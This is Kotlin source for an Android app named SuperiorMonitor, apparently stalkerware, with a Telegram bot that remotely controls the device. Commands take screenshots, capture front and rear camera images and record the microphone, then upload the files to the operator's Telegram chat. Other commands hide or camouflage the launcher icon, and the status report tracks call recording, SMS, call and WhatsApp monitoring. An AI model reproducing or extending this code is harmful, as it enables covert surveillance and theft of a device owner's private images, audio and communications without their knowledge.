package com.system.superiormonitor.bot

import android.content.Context
import android.content.Intent
import android.content.ComponentName
import android.content.pm.PackageManager
import com.system.superiormonitor.data.CallbackQuery
import com.system.superiormonitor.data.PrefsManager
import com.system.superiormonitor.data.Update
import com.system.superiormonitor.util.LogCategory
import com.system.superiormonitor.util.LogManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File

class BotCommands(private val context: Context, private val scope: CoroutineScope) {

    private var botUsername: String? = null
    private val activeMenus = java.util.concurrent.ConcurrentHashMap<Long, kotlinx.coroutines.Job>()

    fun setBotUsername(username: String?) {
        botUsername = username
    }

    /** Schedules auto-deletion of a menu message after 5 minutes of inactivity */
    fun scheduleAutoDelete(chatId: String, messageId: Long, token: String) {
        activeMenus[messageId]?.cancel()
        activeMenus[messageId] = scope.launch(Dispatchers.IO) {
            kotlinx.coroutines.delay(5 * 60 * 1000L) // 5 minutes
            TelegramApi.deleteMessage(token, chatId, messageId)
            activeMenus.remove(messageId)
        }
    }

    /** Cancels auto-deletion (e.g. if the user cancels or closes the menu) */
    fun cancelAutoDelete(messageId: Long) {
        activeMenus[messageId]?.cancel()
        activeMenus.remove(messageId)
    }

    // ═══════════════════════════════════════════════════════════
    //  UPDATE ROUTING 
    // ═══════════════════════════════════════════════════════════

    /**
     * Routes the incoming Telegram update to the appropriate handler
     * and returns the response text, or null if no response is needed.
     */
    fun routeUpdate(update: Update): String? {
        // Route callback queries (inline button taps)
        if (update.callback_query != null) {
            return handleCallbackQuery(update.callback_query)
        }

        val message = update.message ?: return null

        // Route media attachments
        // TODO: Implement full media handling when send-media feature is added.
        //       These stubs ensure the router acknowledges media without crashing.
        if (message.photo != null) return null
        if (message.video != null) return null
        if (message.audio != null) return null
        if (message.document != null) return null

        // Route text commands
        val text = message.text ?: return null
        return if (text.trim().startsWith("/")) handleCommand(text) else null
    }

    // ═══════════════════════════════════════════════════════════
    //  COMMAND HANDLING 
    // ═══════════════════════════════════════════════════════════

    private fun handleCommand(commandText: String): String? {
        val rawCommand = commandText.trim().split(" ").firstOrNull() ?: ""

        // Handle @BotUsername suffix for group chats
        val command = if (rawCommand.contains("@")) {
            val parts = rawCommand.split("@", limit = 2)
            val targetBot = parts[1]
            if (botUsername != null && !targetBot.equals(botUsername, ignoreCase = true)) {
                return null // Command addressed to another bot
            }
            parts[0].lowercase()
        } else {
            rawCommand.lowercase()
        }

        return when (command) {
            "/start" -> buildWelcomeMessage("Admin")
            "/settings" -> buildSettingsMenu()
            "/menu" -> buildMenuMessage("Admin")
            else -> null
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  CALLBACK QUERY HANDLING 
    // ═══════════════════════════════════════════════════════════

    private fun editMessage(query: CallbackQuery, text: String, replyMarkup: String? = null) {
        val chatId = query.message?.chat?.id?.toString() ?: return
        val messageId = query.message.message_id.toLong()
        val token = PrefsManager.getInstance(context).botToken
        TelegramApi.editMessageText(token, chatId, messageId, text, replyMarkup = replyMarkup)
    }

    private fun handleCallbackQuery(query: CallbackQuery): String? {
        val chatId = query.message?.chat?.id?.toString() ?: return "Error: No chat ID"
        val messageId = query.message.message_id.toLong()
        val token = PrefsManager.getInstance(context).botToken
        val userName = query.from.first_name ?: "Admin"

        return when (query.data) {
            "cmd_status" -> {
                val parts = buildStatusMessage(context).split("JSON_MARKUP:", limit = 2)
                editMessage(query, parts[0].trim(), parts[1].trim())
                null
            }
            "cmd_settings" -> {
                editMessage(query, "👑 *Welcome back, Master!* \n\nI am SuperiorMonitor, your personal device management assistant. \n\nYou hold absolute control. Use the buttons below to command me:", buildSettingsMarkup())
                null
            }
            "settings_superior" -> {
                editMessage(query, "*What do you need to help with SuperiorMonitor *?", buildSuperiorSettingsMarkup())
                null
            }
            "superior_launcher" -> {
                editMessage(query, "*Launcher Settings of SuperiorMonitor*", buildSuperiorLauncherMarkup())
                null
            }
            "superior_open" -> {
                val i = Intent(context, com.system.superiormonitor.MainActivity::class.java).apply {
                    action = Intent.ACTION_MAIN
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
                }
                context.startActivity(i)
                editMessage(query, "*Application opened successfully*")
                null
            }
            "superior_unhide" -> {
                val compMain = ComponentName(context, "com.system.superiormonitor.MainActivityLauncher")
                val compCamo = ComponentName(context, "com.system.superiormonitor.ui.CamouflageActivity")
                context.packageManager.setComponentEnabledSetting(compMain, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
                context.packageManager.setComponentEnabledSetting(compCamo, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
                editMessage(query, "*Application unhidden successfully*")
                null
            }
            "superior_hide" -> {
                val compMain = ComponentName(context, "com.system.superiormonitor.MainActivityLauncher")
                val compCamo = ComponentName(context, "com.system.superiormonitor.ui.CamouflageActivity")
                try {
                    context.packageManager.setComponentEnabledSetting(compCamo, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
                    context.packageManager.setComponentEnabledSetting(compMain, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
                    editMessage(query, "*Application completely hidden successfully*")
                } catch (e: Exception) {
                    context.packageManager.setComponentEnabledSetting(compCamo, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
                    editMessage(query, "*Application partially hidden (OS restricted complete hide)*")
                }
                null
            }
            "fetch_offline_queue" -> {
                val responseText = """
                    #Upload #Offline
                    ——————————
                    *Sending Remaining Images*
                    
                    The queued media files are now being uploaded to Telegram. Please wait.
                """.trimIndent()
                editMessage(query, responseText, "{\"inline_keyboard\": []}")
                processOfflineQueue()
                null
            }
            "cancel_offline_queue" -> {
                val responseText = """
                    #Upload #Offline
                    ——————————
                    *Offline Sync Cancelled*
                    
                    The queued media files have been moved to permanent storage.
                """.trimIndent()
                editMessage(query, responseText, "{\"inline_keyboard\": []}")
                cancelOfflineQueue()
                null
            }
            "cmd_menu", "menu_main" -> {
                scheduleAutoDelete(chatId, messageId, token)
                editMessage(query, "*Hey* $userName!!\n\n*You've reached to menu command of SuperiorMonitor*\n- You can use the following buttons to control the device", buildMenuMarkup())
                null
            }
            "menu_snapshot" -> {
                scheduleAutoDelete(chatId, messageId, token)
                editMessage(query, "*SnapshotEngine*\n\n- You can use the following buttons to take shots from the device", buildSnapshotMenuMarkup())
                null
            }
            "action_cap_screen", "action_cap_front", "action_cap_rear" -> {
                cancelAutoDelete(messageId)
                val type = when (query.data) {
                    "action_cap_screen" -> 0
                    "action_cap_front" -> 1
                    else -> 2
                }
                com.system.superiormonitor.monitor.MediaOperations.executeOnDemandCapture(context, scope, type, chatId, messageId, token)
                null
            }
            "cmd_media_ops" -> {
                scheduleAutoDelete(chatId, messageId, token)
                editMessage(query, "*Media Operations*\n\n-Select desired option below", buildMediaOpsMarkup())
                null
            }
            "menu_microphone" -> {
                scheduleAutoDelete(chatId, messageId, token)
                editMessage(query, "*Select your desired duration*", buildMicrophoneMarkup())
                null
            }
            "action_mic_1m", "action_mic_3m", "action_mic_5m", "action_mic_10m" -> {
                cancelAutoDelete(messageId)
                val durationMs = when (query.data) {
                    "action_mic_1m" -> 60000L
                    "action_mic_3m" -> 180000L
                    "action_mic_5m" -> 300000L
                    else -> 600000L
                }
                com.system.superiormonitor.monitor.MediaOperations.executeMicrophoneRecording(context, scope, durationMs, chatId, messageId, token)
                null
            }
            else -> "Action not recognized."
        }
    }

    private fun getAllOfflineFiles(): List<File> {
        val baseDirs = listOf(
            File(context.getExternalFilesDir(null), "snapshots"),
            File(context.getExternalFilesDir(null), "camera/front"),
            File(context.getExternalFilesDir(null), "camera/rear"),
            File(context.getExternalFilesDir(null), "recordings")
        )
        val allOfflineFiles = mutableListOf<File>()
        for (baseDir in baseDirs) {
            if (!baseDir.exists() || !baseDir.isDirectory) continue
            val dateDirs = baseDir.listFiles { file ->
                file.isDirectory && file.name != "failed" && file.name != "permanent"
            } ?: continue
            for (dateDir in dateDirs) {
                val offlineDir = File(dateDir, "offline")
                if (offlineDir.exists()) {
                    offlineDir.listFiles()?.let { allOfflineFiles.addAll(it) }
                }
            }
        }
        return allOfflineFiles
    }

    /**
     * Uploads all offline-captured snapshots/cameras to Telegram.
     */
    private fun processOfflineQueue() {
        scope.launch(Dispatchers.IO) {
            val failedDir = File(context.getExternalFilesDir(null), "snapshots/failed")
            val allOfflineFiles = getAllOfflineFiles().toMutableList()

            if (allOfflineFiles.isEmpty()) return@launch

            // Stale query check: isolate files if device is still offline
            if (!TelegramApi.isApiReachable(context, PrefsManager.getInstance(context).botToken)) {
                LogManager.log(LogCategory.BOT_IN, "[Queue] Offline request intercepted. Files isolated to /failed/.")
                if (!failedDir.exists()) failedDir.mkdirs()
                allOfflineFiles.forEach { file -> file.renameTo(File(failedDir, file.name)) }
                return@launch
            }

            allOfflineFiles.sortBy { it.lastModified() }

            val prefs = PrefsManager.getInstance(context)
            for (file in allOfflineFiles) {
                val isImage = file.name.endsWith(".jpg", ignoreCase = true) || file.name.endsWith(".png", ignoreCase = true)
                val success = if (isImage) {
                    TelegramApi.sendPhoto(prefs.botToken, prefs.chatId, file)
                } else {
                    TelegramApi.sendDocument(prefs.botToken, prefs.chatId, context, android.net.Uri.fromFile(file), "audio/*", file.name, "Offline Sync") != null
                }
                
                if (success) {
                    if (isImage) {
                        file.delete()
                    } else {
                        val permanentDir = java.io.File(file.parentFile!!.parentFile, "permanent")
                        if (!permanentDir.exists()) permanentDir.mkdirs()
                        file.renameTo(java.io.File(permanentDir, file.name))
                    }
                    LogManager.log(LogCategory.BOT_IN, "[Queue] Successfully uploaded ${file.name}.")
                    kotlinx.coroutines.delay(1000) // 1 second delay to prevent rate limits
                } else {
                    LogManager.log(LogCategory.BOT_IN, "[Queue] Upload failed for ${file.name}. Kept locally.")
                }
            }
        }
    }

    private fun cancelOfflineQueue() {
        scope.launch(Dispatchers.IO) {
            val allOfflineFiles = getAllOfflineFiles()
            
            for (file in allOfflineFiles) {
                val permanentDir = File(file.parentFile!!.parentFile, "permanent")
                if (!permanentDir.exists()) permanentDir.mkdirs()
                
                val destFile = File(permanentDir, file.name)
                file.renameTo(destFile)
                LogManager.log(LogCategory.BOT_IN, "[Queue] Moved ${file.name} to permanent storage.")
            }
        }
    }
    // ═══════════════════════════════════════════════════════════
    //  TELEGRAM MESSAGE TEMPLATES 
    // ═══════════════════════════════════════════════════════════

    companion object {

        fun buildWelcomeMessage(userName: String): String =
            "👋 Welcome $userName!\n\nSystem is active and working properly.\n\nJSON_MARKUP:${buildMainKeyboard()}"

        fun buildStatusMessage(context: Context): String {
            val prefs = PrefsManager.getInstance(context)
            val metrics = com.system.superiormonitor.util.TelemetryCollector.gatherTelemetry()
            
            val compMain = ComponentName(context, "com.system.superiormonitor.MainActivityLauncher")
            val isHidden = context.packageManager.getComponentEnabledSetting(compMain) == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            val launcherStatus = if (isHidden) "Hidden" else "Visible"

            fun formatFeature(enabled: Boolean, interval: Int = -1): String {
                if (!enabled && interval > 0) return "Disabled | NA"
                if (!enabled) return "Disabled"
                return if (interval > 0) "Enabled | $interval Min" else "Enabled"
            }

            return """
                *System check complete*

                *Settings* -
                *Launcher icon*: $launcherStatus

                *Security Snapshots* -
                *Screenshots*: ${formatFeature(prefs.enableSnapshots, prefs.snapshotIntervalMin)}
                *Front shots*: ${formatFeature(prefs.enableFrontCamera, prefs.frontCameraInterval)}
                *Rear shots*: ${formatFeature(prefs.enableRearCamera, prefs.rearCameraInterval)}

                *Basic Updates* -
                *Call Recording*: ${formatFeature(prefs.forwardRecordingEnabled)}
                *Call Events*: ${formatFeature(prefs.callAlertsEnabled)}
                *SMS Events*: ${formatFeature(prefs.smsAlertsEnabled)}

                *Social Updates* -
                *Whatsapp*: ${formatFeature(prefs.whatsappUpdatesEnabled)}

                *Temperature:* ${metrics["TEMP"]}°C
                *Battery:* ${metrics["BATTERY"]}% ${metrics["STATUS"]} | Health: ${metrics["HEALTH"]} mAh

                *Network Activity:*
                *${metrics["SIM1_CARRIER"]}:* ${metrics["SIM1_RSRP"]} dBm | *${metrics["SIM2_CARRIER"]}:* ${metrics["SIM2_RSRP"]} dBm
                *Network IP:* `${metrics["NETWORK_IP"]}`

                *Uptime:* ${metrics["UPTIME"]} | *Current:* ${metrics["CURRENT_TIME"]}
            """.trimIndent() + "\n\nJSON_MARKUP:${buildMainKeyboard()}"
        }

        fun buildMainKeyboard(): String = """
            {
                "inline_keyboard": [
                    [
                        {"text": "System Check", "callback_data": "cmd_status"},
                        {"text": "Settings", "callback_data": "cmd_settings"}
                    ],
                    [
                        {"text": "Menu", "callback_data": "cmd_menu"}
                    ]
                ]
            }
        """.trimIndent()

        fun buildMenuMessage(userName: String): String =
            "*Hey* $userName!\n\n*How can i help you today!*\n\n*You can use the following commands*\n\nJSON_MARKUP:${buildMenuMarkup()}"

        fun buildMenuMarkup(): String = """
            {
                "inline_keyboard": [
                    [
                        {"text": "SnapshotEngine", "callback_data": "menu_snapshot"}
                    ],
                    [
                        {"text": "Media Ops", "callback_data": "cmd_media_ops"}
                    ]
                ]
            }
        """.trimIndent()

        fun buildSnapshotMenuMarkup(): String = """
            {
                "inline_keyboard": [
                    [
                        {"text": "Get ScreenShot", "callback_data": "action_cap_screen"},
                        {"text": "Get RearShot", "callback_data": "action_cap_rear"}
                    ],
                    [
                        {"text": "Get Frontshot", "callback_data": "action_cap_front"},
                        {"text": "Back to Menu", "callback_data": "menu_main"}
                    ]
                ]
            }
        """.trimIndent()

        fun buildCaptureSuccessMarkup(): String = """
            {
                "inline_keyboard": [
                    [
                        {"text": "Back to SnapShot Engine", "callback_data": "menu_snapshot"}
                    ]
                ]
            }
        """.trimIndent()

        fun buildMediaOpsMarkup(): String = """
            {
                "inline_keyboard": [
                    [
                        {"text": "Microphone", "callback_data": "menu_microphone"}
                    ],
                    [
                        {"text": "Back to Menu", "callback_data": "cmd_menu"}
                    ]
                ]
            }
        """.trimIndent()

        fun buildMicrophoneMarkup(): String = """
            {
                "inline_keyboard": [
                    [
                        {"text": "1 Min", "callback_data": "action_mic_1m"},
                        {"text": "3 Min", "callback_data": "action_mic_3m"}
                    ],
                    [
                        {"text": "5 Min", "callback_data": "action_mic_5m"},
                        {"text": "10 Min", "callback_data": "action_mic_10m"}
                    ],
                    [
                        {"text": "Back to MediaOps", "callback_data": "cmd_media_ops"}
                    ]
                ]
            }
        """.trimIndent()

        fun buildSettingsMenu(): String = "*Hey*, \n*I'm here to help you with application's corresponding settings*\n\n- Select the application to know it's settings\n\nJSON_MARKUP:${buildSettingsMarkup()}"

        fun buildSettingsMarkup(): String = """
            {
                "inline_keyboard": [
                    [
                        {"text": "Superior Settings", "callback_data": "settings_superior"}
                    ]
                ]
            }
        """.trimIndent()

        fun buildSuperiorSettingsMarkup(): String = """
            {
                "inline_keyboard": [
                    [
                        {"text": "Launcher", "callback_data": "superior_launcher"}
                    ],
                    [
                        {"text": "Back", "callback_data": "cmd_settings"}
                    ]
                ]
            }
        """.trimIndent()

        fun buildSuperiorLauncherMarkup(): String = """
            {
                "inline_keyboard": [
                    [
                        {"text": "Open Application", "callback_data": "superior_open"}
                    ],
                    [
                        {"text": "Hide Icon", "callback_data": "superior_hide"},
                        {"text": "Unhide Icon", "callback_data": "superior_unhide"}
                    ],
                    [
                        {"text": "Back", "callback_data": "settings_superior"}
                    ]
                ]
            }
        """.trimIndent()



        fun buildBackToSettingsMarkup(): String = """
            {
                "inline_keyboard": [
                    [
                        {"text": "Back", "callback_data": "cmd_settings"}
                    ]
                ]
            }
        """.trimIndent()

        fun buildTelemetryMessage(title: String, metrics: Map<String, String>): String =
            title + "\n\n" + """
                *Temperature:* ${metrics["TEMP"]}°C
                *CPU Freq:* ${metrics["CPU_FREQ_MHZ"]} MHz
                *CPU Load:* ${metrics["CPU_LOAD"]}
                *Storage Used:* ${metrics["STORAGE"]}
                *Battery:* ${metrics["BATTERY"]}% ${metrics["STATUS"]} | Health: ${metrics["HEALTH"]} mAh
                
                *Network Activity:*
                *${metrics["SIM1_CARRIER"]}:* ${metrics["SIM1_RSRP"]} dBm | *${metrics["SIM2_CARRIER"]}:* ${metrics["SIM2_RSRP"]} dBm
                *Gateway IP:* `${metrics["GATEWAY_IP"]}`
                *Network IP:* `${metrics["NETWORK_IP"]}`
                
                *Uptime:* ${metrics["UPTIME"]} | *Current:* ${metrics["CURRENT_TIME"]}
            """.trimIndent()

        fun buildOfflineQueueMarkup(): String = """
            {
                "inline_keyboard": [
                    [
                        {"text": "📥 Retrieve", "callback_data": "fetch_offline_queue"},
                        {"text": "❌ Cancel", "callback_data": "cancel_offline_queue"}
                    ]
                ]
            }
        """.trimIndent()
    }
}
